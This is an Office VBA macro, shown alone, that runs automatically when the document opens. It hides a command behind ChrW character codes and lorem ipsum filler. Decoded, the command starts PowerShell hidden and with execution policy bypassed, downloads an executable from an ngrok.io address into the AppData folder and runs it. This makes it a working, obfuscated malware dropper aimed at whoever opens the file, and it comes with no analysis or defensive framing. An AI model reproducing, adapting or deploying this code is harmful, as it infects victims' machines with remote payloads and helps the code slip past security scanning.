Sub Auto_Open()
Dim a As String
Dim b As String
Dim c As String
Dim d As String
Dim e As String
Dim f As String
Dim g As String
Dim h As String
Dim i As String
Dim j As String
Dim k As String
Dim l As String
Dim m As String
Dim n As String
Dim o As String
'
'
'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec sit amet ante nibh.
' Vestibulum tellus nisi, luctus non viverra at, aliquam ac metus. Nulla quis aliquet augue. 
'Curabitur vel nisl eget urna blandit ultrices nec nec dolor. Aliquam tempus commodo est ac vehicula. Nullam ut felis iaculis, mollis mi vel, vestibulum est. Proin porttitor felis nec neque imperdiet vulputate. In hac habitasse platea dictumst. Donec efficitur urna id lorem rhoncus, tincidunt dictum augue condimentum. Etiam viverra efficitur mollis. Morbi urna dolor, dictum nec tristique nec, lacinia non sem. Nulla vitae ex cursus, maximus est id, suscipit erat. Duis tincidunt nisl a ligula laoreet, eu ultrices ante convallis. Integer placerat massa non est volutpat sodales. Donec id erat in magna placerat laoreet nec vitae nunc.
' Etiam urna arcu, rhoncus at ligula nec, accumsan rutrum ante.
'
'

Dim last As String

Dim p As String
Dim q As String
Dim r As String
Dim s As String
Dim t As String
Dim u As String
Dim v As String
Dim w As String

a = ChrW(112) & ChrW(111) & ChrW(119) & ChrW(101) & ChrW(114) & ChrW(115) & ChrW(104) & ChrW(101) & ChrW(108) & ChrW(108) & ChrW(46)
b = ChrW(101) & ChrW(120) & ChrW(101) & ChrW(32) & ChrW(45) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(109) & ChrW(97) & ChrW(110)
c = ChrW(100) & ChrW(32) & ChrW(80) & ChrW(111) & ChrW(119) & ChrW(101) & ChrW(114) & ChrW(83) & ChrW(104) & ChrW(101) & ChrW(108)
d = ChrW(108) & ChrW(32) & ChrW(45) & ChrW(69) & ChrW(120) & ChrW(101) & ChrW(99) & ChrW(117) & ChrW(116) & ChrW(105) & ChrW(111)
e = ChrW(110) & ChrW(80) & ChrW(111) & ChrW(108) & ChrW(105) & ChrW(99) & ChrW(121) & ChrW(32) & ChrW(98) & ChrW(121) & ChrW(112)
f = ChrW(97) & ChrW(115) & ChrW(115) & ChrW(32) & ChrW(45) & ChrW(110) & ChrW(111) & ChrW(112) & ChrW(114) & ChrW(111) & ChrW(102)
g = ChrW(105) & ChrW(108) & ChrW(101) & ChrW(32) & ChrW(45) & ChrW(119) & ChrW(105) & ChrW(110) & ChrW(100) & ChrW(111) & ChrW(119)
h = ChrW(115) & ChrW(116) & ChrW(121) & ChrW(108) & ChrW(101) & ChrW(32) & ChrW(104) & ChrW(105) & ChrW(100) & ChrW(100) & ChrW(101)
i = ChrW(110) & ChrW(32) & ChrW(45) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(109) & ChrW(97) & ChrW(110) & ChrW(100) & ChrW(32)
j = ChrW(40) & ChrW(78) & ChrW(101) & ChrW(119) & ChrW(45) & ChrW(79) & ChrW(98) & ChrW(106) & ChrW(101) & ChrW(99) & ChrW(116)
k = ChrW(32) & ChrW(83) & ChrW(121) & ChrW(115) & ChrW(116) & ChrW(101) & ChrW(109) & ChrW(46) & ChrW(78) & ChrW(101) & ChrW(116)
l = ChrW(46) & ChrW(87) & ChrW(101) & ChrW(98) & ChrW(67) & ChrW(108) & ChrW(105) & ChrW(101) & ChrW(110) & ChrW(116) & ChrW(41)
m = ChrW(46) & ChrW(68) & ChrW(111) & ChrW(119) & ChrW(110) & ChrW(108) & ChrW(111) & ChrW(97) & ChrW(100) & ChrW(70) & ChrW(105)
n = ChrW(108) & ChrW(101) & ChrW(40) & ChrW(39) & ChrW(104) & ChrW(116) & ChrW(116) & ChrW(112) & ChrW(58) & ChrW(47) & ChrW(47)
o = ChrW(56) & ChrW(54) & ChrW(55) & ChrW(54) & ChrW(49) & ChrW(48) & ChrW(52) & ChrW(53) & ChrW(50) & ChrW(100) & ChrW(51) & ChrW(97)
p = ChrW(46) & ChrW(110) & ChrW(103) & ChrW(114) & ChrW(111) & ChrW(107) & ChrW(46) & ChrW(105) & ChrW(111) & ChrW(47) & ChrW(101)
q = ChrW(120) & ChrW(97) & ChrW(109) & ChrW(112) & ChrW(108) & ChrW(101) & ChrW(47) & ChrW(115) & ChrW(117) & ChrW(109) & ChrW(97)
r = ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(39) & ChrW(44) & ChrW(34) & ChrW(36) & ChrW(101) & ChrW(110) & ChrW(118)
s = ChrW(58) & ChrW(65) & ChrW(80) & ChrW(80) & ChrW(68) & ChrW(65) & ChrW(84) & ChrW(65) & ChrW(92) & ChrW(36) & ChrW(80) & ChrW(114)
t = ChrW(111) & ChrW(99) & ChrW(78) & ChrW(97) & ChrW(109) & ChrW(101) & ChrW(34) & ChrW(41) & ChrW(59) & ChrW(83) & ChrW(116) & ChrW(97)
u = ChrW(114) & ChrW(116) & ChrW(45) & ChrW(80) & ChrW(114) & ChrW(111) & ChrW(99) & ChrW(101) & ChrW(115) & ChrW(115) & ChrW(32) & ChrW(40)
v = ChrW(34) & ChrW(36) & ChrW(101) & ChrW(110) & ChrW(118) & ChrW(58) & ChrW(65) & ChrW(80) & ChrW(80) & ChrW(68) & ChrW(65) & ChrW(84)
w = ChrW(65) & ChrW(92) & ChrW(115) & ChrW(117) & ChrW(109) & ChrW(97) & ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(34) & ChrW(41)

last = a + b + c + d + e + f + g + h + i + j + k + l + m + n + o + p + q + r + s + t + u + v + w

Shell (last)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub